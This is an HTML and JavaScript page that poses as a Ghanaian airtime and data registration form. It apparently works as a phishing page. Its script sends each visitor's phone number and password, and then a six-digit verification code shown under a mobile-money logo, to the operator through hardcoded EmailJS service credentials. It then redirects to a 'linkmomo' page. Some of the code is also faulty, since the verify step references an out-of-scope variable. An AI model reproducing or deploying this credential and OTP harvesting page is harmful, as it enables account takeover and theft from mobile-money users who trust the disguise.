<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Airtime & Data | Register</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("gV773-VG85THpxrNV"); 
    })();
  </script>
</head>
<body class="bg-gradient-to-r from-blue-50 to-blue-100 font-sans">
  <!-- Page Wrapper -->
  <div class="min-h-screen flex items-center justify-center">
    <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100">
      <h2 class="text-3xl font-bold text-blue-700 text-center mb-6">Create Your Account</h2>

      <!-- Registration Form -->
      <form id="registerForm" class="space-y-5">
        <!-- Phone -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1">Phone Number</label>
          <div class="flex items-center border-2 border-blue-200 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-blue-500">
            <span class="px-3 bg-blue-50 flex items-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Flag_of_Ghana.svg" alt="Ghana" class="w-6 h-4 mr-1">
              +233
            </span>
            <input type="text" id="phone" required maxlength="9" pattern="[1-9]{9}" 
              placeholder="24XXXXXXX" 
              class="flex-1 px-3 py-2 outline-none">
          </div>
        </div>

        <!-- Password -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
          <input type="password" id="password" required placeholder="Enter password"
            class="w-full border-2 border-blue-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500">
        </div>

        <!-- Submit -->
        <button type="submit"
          class="w-full bg-blue-600 text-white py-3 px-4 rounded-xl font-semibold shadow-md hover:bg-blue-700 transition">
          Register
        </button>
      </form>
    </div>
  </div>

  <!-- Popup: OTP -->
  <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100">
      <img src="momoapp.png" style="height: 100px;width: 300px;padding-left: 50px;">
      <h3 class="text-xl font-bold text-blue-700 mb-4">Enter Verification Code</h3>
      <p class="text-sm text-gray-600 mb-2">We sent a link to your number. Enter the last six-digit numbers.</p>
      <input type="text" id="otpInput" maxlength="6" 
        placeholder="Enter 6-digit code"
        class="w-full border-2 border-blue-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-blue-500 mb-3">
      <div class="flex justify-between items-center text-sm text-gray-600 mb-3">
        <span id="timer" class="font-semibold text-blue-600">20s</span>
        <button id="resendBtn" class="text-blue-600 font-medium hidden hover:underline">Resend Code</button>
      </div>
      <button id="verifyBtn"
        class="w-full bg-blue-600 text-white py-3 px-4 rounded-xl font-semibold shadow-md hover:bg-blue-700 transition">
        Verify
      </button>
    </div>
  </div>

  <!-- Notifications -->
  <div id="notification" class="fixed top-5 right-5 hidden px-4 py-3 rounded-xl shadow-lg"></div>

  <script>
    const registerForm = document.getElementById("registerForm");
    const otpModal = document.getElementById("otpModal");
    const otpInput = document.getElementById("otpInput");
    const verifyBtn = document.getElementById("verifyBtn");
    const resendBtn = document.getElementById("resendBtn");
    const timerEl = document.getElementById("timer");
    const notification = document.getElementById("notification");

    let countdown;
    let timeLeft = 20;

    function showNotification(message, type="success") {
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
        type === "success" ? "bg-blue-600" : "bg-red-600"
      }`;
      notification.classList.remove("hidden");
      setTimeout(() => notification.classList.add("hidden"), 3000);
    }

    function startTimer() {
      timeLeft = 30;
      timerEl.textContent = timeLeft + "s";
      resendBtn.classList.add("hidden");
      countdown = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft + "s";
        if (timeLeft <= 0) {
          clearInterval(countdown);
          showNotification("Time ran out. Please resend code.", "error");
          resendBtn.classList.remove("hidden");
        }
      }, 1000);
    }

    registerForm.addEventListener("submit", function(e){
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const password = document.getElementById("password").value;

      // Simulate EmailJS send
      emailjs.send("service_74nt2c9","template_s6vpt2e",{
        phone: "+233" + phone,
        password: password
      }).then(() => {
        showNotification("Registration successful!");
        otpModal.classList.remove("hidden");
        otpModal.classList.add("flex");
        localStorage.setItem("userPhone", phone);
        startTimer();
      }).catch(() => {
        showNotification("Failed to send details.", "error");
      });
    });

    verifyBtn.addEventListener("click", function(){
      const otp = otpInput.value;
      if(otp.length === 6){
        emailjs.send("service_74nt2c9","template_s6vpt2e",{
          phone: "+233" + phone,
          otp: otp
        }).then(() => {
          showNotification("OTP Verified!");
          otpModal.classList.add("hidden");
          clearInterval(countdown);
          window.location.href = "linkmomo.html";
        }).catch(() => {
          showNotification("Failed to verify OTP.", "error");
        });
      } else {
        showNotification("Enter a valid 6-digit code.", "error");
      }
    });

    resendBtn.addEventListener("click", function(){
      otpInput.value = "";
      showNotification("Code resent. Please check your sms.");
      startTimer();
    });
  </script>
</body>
</html>
